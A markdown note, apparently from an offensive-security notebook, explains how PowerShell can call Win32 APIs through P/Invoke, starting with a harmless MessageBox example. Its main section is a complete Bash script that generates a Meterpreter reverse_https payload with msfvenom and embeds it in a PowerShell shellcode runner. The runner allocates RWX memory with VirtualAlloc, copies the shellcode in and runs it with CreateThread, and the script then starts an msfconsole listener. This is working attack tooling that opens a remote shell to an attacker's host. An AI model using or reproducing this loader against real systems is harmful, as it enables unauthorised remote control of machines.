---
title: Executing Win32 APIs in PowerShell
tags:
  - breach
  - operations
  - win32api
  - api
  - powershell
  - execution
---

We can't execute **Win32API** methods directly from PowerShell. What are
**Win32API** methods? We discuss them in
[[phishing-in-microsoft-office#Calling Win32API|Phishing in Microsoft Office - Calling Win32API]].
These are methods usually implemented in `.dll`s like `kernel32.dll` that you
can usually find in `C:\Windows\System32`.

We can, however, compile and execute C# (CSharp) from PowerShell, and invoke
these methods using the .NET Framework. Using
[Platform Invoke (P/Invoke)](https://learn.microsoft.com/en-us/dotnet/standard/native-interop/pinvoke),
we can directly reference **Win32API** methods implemented in our target
`.dll`s.

For effective translation of C# types to C/C++ types for parameters defined in
these **Win32API** methods, we can reference helpful documentation provided at
[pinvoke.net](https://www.pinvoke.net/). The following PowerShell script
demonstrates how to invoke **user32.MessageBox** from `user32.dll` using
**P/Invoke** and **C#**:

```powershell
$User32 = @"
using System;
using System.Runtime.InteropServices;

public class User32 {
    [DllImport("user32.dll", CharSet=CharSet.Auto)]
    public static extern int MessageBox(IntPtr hWnd, String text,
        String caption, int options);
}
"@

Add-Type $User32

[User32]::MessageBox(0, "This is an alert", "MyBox", 0)
```

### Executing shellcode in PowerShell

The following example uses the interoperability features described above to
define references to the `VirtualAlloc` and `CreateThread` methods from
`kernel32.dll` . This **Bash** script will generate a **Meterpreter**
`windows/x64/meterpreter/reverse_https` payload directed to callback to a
provided `LHOST` and `LPORT`for the next stage of the **Meterpreter** payload.

The PowerShell shellcode buffer for the **Meterpreter** payload will be placed
into a **PowerShell** script that will call `VirtualAlloc` to allocate an `RWX`
memory segment within the current process. The script will proceed to call
`System.Runtime.InteropServices.Marshal` to copy the shellcode from managed
memory to unmanaged memory - copying our shellcode to the newly created buffer
from the previous `VirtualAlloc` call. Finally, we call `CreateThread`
providing an address to our shellcode payload memory segment to gain shellcode
execution.

After generating our PowerShell payload, we kick off an `msfconsole` session to
listen for our **Meterpreter** payload callback:

```bash
#!/bin/bash

set -ex -o pipefail

MSFPAYLOAD="windows/x64/meterpreter/reverse_https"
MSFCONSOLE=$(which msfconsole)
MSFVENOM=$(which msfvenom)


msfvenom() {
    PAYLOAD=$($MSFVENOM \
        -p $MSFPAYLOAD \
        LHOST=$LHOST \
        LPORT=$LPORT \
        EXITFUNC=thread \
        -f ps1 2>/dev/null)
}


generate_powershell() {
    tee payload.ps1 << EOF
\$Kernel32 = @"
using System;
using System.Runtime.InteropServices;

public class Kernel32 {
    [DllImport("kernel32")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32", CharSet=CharSet.Ansi)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
}
"@

Add-Type \$Kernel32

$PAYLOAD

\$size = \$buf.Length

[IntPtr]\$addr = [Kernel32]::VirtualAlloc(0, \$size, 0x3000, 0x40)

[System.Runtime.InteropServices.Marshal]::Copy(\$buf, 0, \$addr, \$size)

\$thandle=[Kernel32]::CreateThread(0, 0, \$addr, 0, 0, 0)

[Kernel32]::WaitForSingleObject(\$thandle, [uint32]"0xFFFFFFFF")
EOF
}

listen() {
    $MSFCONSOLE \
        -q \
        -x "use multi/handler; \
            set payload $MSFPAYLOAD; \
            set LHOST $LHOST; \
            set LPORT $LPORT; \
            exploit"
}


LHOST=$1
LPORT=$2

msfvenom
generate_powershell
listen
```
